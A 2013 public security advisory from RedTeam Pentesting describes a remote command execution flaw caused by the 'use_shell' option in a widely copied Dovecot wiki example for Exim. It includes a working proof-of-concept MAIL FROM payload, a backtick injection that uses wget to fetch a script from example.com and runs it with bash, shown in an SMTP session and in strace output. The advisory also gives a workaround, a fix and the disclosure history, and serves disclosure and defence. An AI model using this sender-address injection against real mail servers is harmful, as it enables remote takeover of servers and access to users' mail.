Advisory: Exim with Dovecot: Typical Misconfiguration Leads to Remote
          Command Execution

During a penetration test a typical misconfiguration was found in the
way Dovecot is used as a local delivery agent by Exim. A common use
case for the Dovecot IMAP and POP3 server is the use of Dovecot as a
local delivery agent for Exim. The Dovecot documentation contains an example
using a dangerous configuration option for Exim, which leads to a remote
command execution vulnerability in Exim.


Details
=======

Product: Exim with Dovecot LDA and Common Example Documentation
Affected Versions: Example Configuration in Dovecot Wiki since
                   2009-10-23
Vulnerability Type: Remote Code Execution
Security Risk: HIGH
Vendor URL: http://www.exim.org http://www.dovecot.org
Vendor Status: notified
Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2013-001
Advisory Status: public


Introduction
============

Dovecot is an open source IMAP and POP3 server. Dovecot is used both for
small and large installations because of its good performance and simple
administration. Exim is a message transfer agent developed at the
University of Cambridge, freely available under the terms of the GNU
General Public Licence. Both services are commonly used in tandem with
each other. Dovecot is often configured in Exim to handle mail delivery to
mailboxes.

The Dovecot wiki contains an example configuration for Exim to have
Dovecot handle mail delivery in conjunction with LDAP. Using Dovecot as
a local delivery agent (LDA) for Exim is a common use case for an
Exim/Dovecot server. The Dovecot wiki, which is also packaged as
documentation with the Dovecot source packages and many Linux
distribution packages, contains example configurations for Exim. One
configuration contains a dangerous option, which leads to a remote
command execution vulnerability in Exim. Since this configuration
concerns a very common use case of Dovecot with Exim and is widely
repackaged in distribution packages, users of Dovecot and Exim should
check their current configuration of Exim.


More Details
============

Dovecot and Exim can be used together without any further configuration
of the Exim mail delivery process. This will result in a configuration,
where Dovecot can access mails delivered to a mailbox of a user, but
message filtering through the Dovecot server-side filters is not
possible.

In order for server-side mail filtering by the Sieve implementation of
Dovecot to work, Dovecot provides its own local delivery agent (LDA).
This agent must be added to the Exim delivery configuration as a mail
transport. To make such a configuration work, Exim offers the
possibility to use pipe transports[1]. The Exim daemon then hands the
email messages over to an external program, in this case the Dovecot LDA
(on Debian GNU/Linux found at /usr/lib/dovecot/deliver).

The Dovecot-Wiki[2] and documentation propose, among others, a
configuration for using Exim with the Dovecot LDA and multiple UIDs
which are loaded from an external source, for example LDAP. It is
assumed that this configuration is often used as a template when
configuring new email servers, as coupling SMTP and POP3/IMAP servers
with an external user database like LDAP is common. Furthermore, this
example configuration is rather detailed. Therefore, it is estimated
that many administrators based their configuration on this one.

The example transport configuration from the Dovecot wiki is shown
below:
------------------------------------------------------------------------
dovecot_deliver:
  debug_print = "T: Dovecot_deliver for $local_part@$domain"
  driver = pipe
  # Uncomment the following line and comment the one after it if you
  # want deliver to try to deliver subaddresses into INBOX.{subaddress}.
  # If you do this, uncomment the local_part_suffix* lines in the router
  # as well. Make sure you also change the separator to suit your local
  # setup.
  #command = /usr/lib/dovecot/deliver -e -k -s \
  #   -m "INBOX|${substr_1:$local_part_suffix}" \
  command = /usr/lib/dovecot/deliver -e -k -s \
      -f "$sender_address" -a "$original_local_part@$original_domain"
  use_shell
  environment = USER=$local_part@$domain
  umask = 002
  message_prefix =
  message_suffix =
  delivery_date_add
  envelope_to_add
  return_path_add
  log_output
  log_defer_output
  return_fail_output
  freeze_exec_fail
  #temp_errors = *
  temp_errors = 64 : 69 : 70 : 71 : 72 : 73 : 74 : 75 : 78
------------------------------------------------------------------------

With the "use_shell" option, Exim is instructed not to start the program
directly, but rather expand all Exim variables and pass this string to a
shell afterwards, which then starts the LDA. The content of the variable
$sender_address can in most standard setups be controlled by an
attacker, its value is inserted verbatim into the string which is
supplied to the shell. This enables attackers to execute arbitrary shell
commands in the name of the Exim system user.

The following conversation with the mail server demonstrates downloading
and executing a shell script. Since spaces are not accepted within a
sender email address, ${IFS} can be used instead.

------------------------------------------------------------------------
220 host ESMTP Exim 4.72 Mon, 22 Apr 2013 13:22:23 +0200
EHLO example.com
250-host Hello localhost [127.0.0.1]
250-SIZE 52428800
250-PIPELINING
250 HELP
MAIL FROM: red`wget${IFS}-O${IFS}/tmp/p${IFS}example.com/test.sh``bash${IFS}/tmp/p`team@example.com
250 OK
RCPT TO: someuser@example.com
250 Accepted
DATA
354 Enter message, ending with "." on a line by itself
Subject: test

.
250 OK id=1UUEqF-0004P8-2B
------------------------------------------------------------------------

Attaching and following the Exim process with strace during this example
conversation results in the following strace output:
------------------------------------------------------------------------
# strace -p $(pgrep Exim4) -s100 -f -q -e execve
[pid 16962] execve("/usr/sbin/Exim4", ["/usr/sbin/Exim4", "-Mc",
            "1UUEwf-0004PZ-9n"], [/* 26 vars */]) = 0
[pid 16964] execve("/bin/sh", ["/bin/sh", "-c",
            "/usr/lib/Dovecot/deliver -e -k -s -f 
            \"red`wget${IFS}-O${IFS}/tmp/p${IFS}example.com/test.sh``bash${I"...],
            [/* 14 vars */]) = 0
[pid 16966] execve("/usr/bin/wget", ["wget", "-O", "/tmp/p",
            "example.com/test.sh"], [/* 14 vars */]) = 0
[pid 16964] --- SIGCHLD (Child exited) @ 0 (0) ---
[pid 16967] execve("/bin/bash", ["bash", "/tmp/p"], [/* 14 vars */]) = 0
[pid 16964] --- SIGCHLD (Child exited) @ 0 (0) ---
[pid 16968] execve("/usr/lib/Dovecot/deliver", ["/usr/lib/Dovecot/deliver",
            "-e", "-k", "-s", "-f", "redteam@example.com", "-a",
            "someuser@example.com"], [/* 14 vars */]) = 0
------------------------------------------------------------------------

This shows that remote command execution is possible in this
configuration.

In order to reproduce this vulnerability it is sufficient to install
Exim and Dovecot, then configure the Dovecot LDA as a pipe transport in
Exim as described by the Dovecot wiki.

This example configuration was added to the Dovecot wiki in 2009 and is
likely to be used in numerous Exim/Dovecot installations[3]. The Dovecot
wiki is also contained within the Dovecot source files. The dangerous
configuration suggesting the "use_shell" option mentioned in the file
doc/wiki/LDA.Exim.txt.

An example for the widespread use of this configuration example is the
Debian package "dovecot-common" where this example configuration is
found in the file /usr/share/doc/dovecot-common/wiki/LDA.Exim.txt.gz[4].

While the redistribution in Debian was verified, it is very likely that
other distributions also contain this vulnerable configuration example.


Proof of Concept
================

Sender address which tricks the mail server to download and execute a
shell script on delivery:
------------------------------------------------------------------------
red`wget${IFS}-O${IFS}/tmp/p${IFS}example.com/test.sh``bash${IFS}/tmp/p`team@example.com
------------------------------------------------------------------------


Workaround
==========

Users who use Exim in tandem with Dovecot LDA should check their Exim
transport configuration for the "use_shell" option. In the
configuration example the "use_shell" option is not necessary and should
be removed. In this case the mail server directly starts the LDA
without a shell, as the following output of strace during a delivery
shows:

------------------------------------------------------------------------
[pid 17485] execve("/usr/sbin/exim4", ["/usr/sbin/exim4", "-Mc",
            "1UUFGk-0004Y0-Rb"], [/* 14 vars */]) = 0
[pid 17487] execve("/usr/lib/dovecot/deliver", ["/usr/lib/dovecot/deliver",
            "-e", "-k", "-s", "-f",
            "red`wget${IFS}-O${IFS}/tmp/p${IFS}example.com/test.sh``bash${IFS}/tmp/p`team@example.com",
            "-a", "someuser@example.com"], [/* 14 vars */]) = 0
------------------------------------------------------------------------

As shown the sender address string is directly passed to the LDA, and
not expanded by a shell.


Fix
===

Administrators should check their configuration as described under
"Workaround".

The dangerous option "use_shell" should be removed from the Dovecot wiki
and all the source packages. Also, all distribution packages of Dovecot
that contain this example configuration should be changed to prevent
users from introducing a remote command execution vulnerability in their
Exim/Dovecot installation.



Security Risk
=============

The documentation on a configuration example for a common use case of
Dovecot as a local delivery agent for the Exim mail server contains a
configuration option which leads to a remote command execution.
Attackers can execute arbitrary shell commands as the user the Exim mail
server runs as. It is estimated that many administrators based their
Exim configuration on this example. The resulting vulnerability may be
used to establish a foothold on a mail server, read users' mails or
expand access rights via a local exploit. Since this configuration
example is redistributed with Dovecot packages and describes a common
use case for Dovecot and Exim, this configuration is considered to be a
high risk.


History
=======

2013-03-05 Vulnerability identified
2013-05-02 Vendor notified
2013-05-02 Vendor confirmed the vulnerability
2013-05-02 Vendor removed the offending line from the Dovecot wiki
2013-05-03 Advisory released


References
==========
[1] http://www.exim.org/exim-html-current/doc/html/spec_html/ch-the_pipe_transport.html
[2] http://wiki.dovecot.org/LDA/Exim
[3] http://wiki.dovecot.org/LDA/Exim?action=diff&rev2=12&rev1=11
[4] http://packages.debian.org/search?keywords=dovecot-common


RedTeam Pentesting GmbH
=======================

RedTeam Pentesting offers individual penetration tests, short pentests,
performed by a team of specialised IT-security experts. Hereby, security
weaknesses in company networks or products are uncovered and can be
fixed immediately.

As there are only few experts in this field, RedTeam Pentesting wants to
share its knowledge and enhance the public knowledge with research in
security-related areas. The results are made available as public
security advisories.

More information about RedTeam Pentesting can be found at
https://www.redteam-pentesting.de.

-- 
RedTeam Pentesting GmbH                   Tel.: +49 241 510081-0
Dennewartstr. 25-27                       Fax : +49 241 510081-99
52068 Aachen                    https://www.redteam-pentesting.de
Germany                        Registergericht: Aachen HRB 14004
Geschäftsführer: Patrick Hof, Jens Liebchen, Claus R. F. Overbeck